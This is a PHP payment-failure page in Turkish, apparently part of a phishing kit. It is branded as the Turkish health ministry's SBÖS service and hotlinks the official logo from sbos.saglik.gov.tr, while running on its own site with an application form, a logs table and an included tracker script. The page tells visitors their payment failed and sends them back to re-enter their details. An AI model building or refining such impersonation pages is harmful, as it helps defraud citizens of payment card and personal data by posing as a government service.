<?php
require_once 'api/config.php';

$logId = isset($_GET['id']) ? intval($_GET['id']) : 0;
$errorMessage = 'Ödeme işleminiz tamamlanamadı. Lütfen bilgilerinizi kontrol ederek tekrar deneyiniz.';

if ($logId) {
    try {
        $db = getDB();
        $stmt = $db->prepare("SELECT error_message FROM logs WHERE id = ?");
        $stmt->execute([$logId]);
        $log = $stmt->fetch();
        
        if ($log && $log['error_message']) {
            $errorMessage = $log['error_message'];
        }
    } catch (PDOException $e) {
    }
}
?>
<!DOCTYPE html>
<html lang="tr" class="notranslate" translate="no">
<head>
    <meta charset="utf-8">
    <title>İşlem Hatası - SBÖS</title>
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,shrink-to-fit=no,viewport-fit=cover">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, sans-serif;
            background: #f0f4f8;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }
        .top-bar { background: #D32F2F; height: 4px; }
        .header { padding: 30px 40px; display: flex; justify-content: center; z-index: 1; }
        .logo { display: flex; align-items: center; gap: 4px; text-decoration: none; }
        .logo img { height: 36px; }
        .main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; z-index: 1; }
        .card {
            background: #fff; border-radius: 24px; padding: 48px 40px; width: 100%;
            max-width: 480px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); text-align: center;
        }
        .error-icon {
            width: 72px; height: 72px; border-radius: 50%; background: #fef2f2;
            display: flex; align-items: center; justify-content: center; margin: 0 auto 24px;
        }
        .error-icon svg { width: 36px; height: 36px; }
        .card h1 { font-size: 20px; font-weight: 700; color: #1a1a2e; margin-bottom: 8px; }
        .card p { font-size: 14px; color: #8e8ea0; line-height: 1.6; margin-bottom: 28px; }
        .btn {
            display: block; width: 100%; padding: 14px; border-radius: 14px;
            font-size: 15px; font-weight: 600; text-align: center; text-decoration: none;
            transition: all 0.2s; cursor: pointer; border: none;
        }
        .btn-primary { background: #D32F2F; color: #fff; margin-bottom: 10px; }
        .btn-primary:hover { background: #B71C1C; }
        .btn-secondary { background: #f0f0f5; color: #555; }
        .btn-secondary:hover { background: #e5e5ec; }
        @media (max-width: 639px) {
            .header { padding: 20px; }
            .logo img { height: 28px; }
            .card { padding: 32px 24px; border-radius: 20px; }
        }
    </style>
</head>
<body>
    <div class="top-bar"></div>
    <div class="header">
        <a href="index.php" class="logo">
            <img src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" alt="SBÖS">
        </a>
    </div>

    <div class="main">
        <div class="card">
            <div class="error-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <line x1="15" y1="9" x2="9" y2="15"/>
                    <line x1="9" y1="9" x2="15" y2="15"/>
                </svg>
            </div>
            <h1>Ödeme Başarısız</h1>
            <p><?= htmlspecialchars($errorMessage) ?></p>
            <a href="basvuru.php" class="btn btn-primary">Tekrar Dene</a>
            <a href="index.php" class="btn btn-secondary">Ana Sayfaya Dön</a>
        </div>
    </div>

    <?php include 'includes/tracker.php'; ?>
</body>
</html>
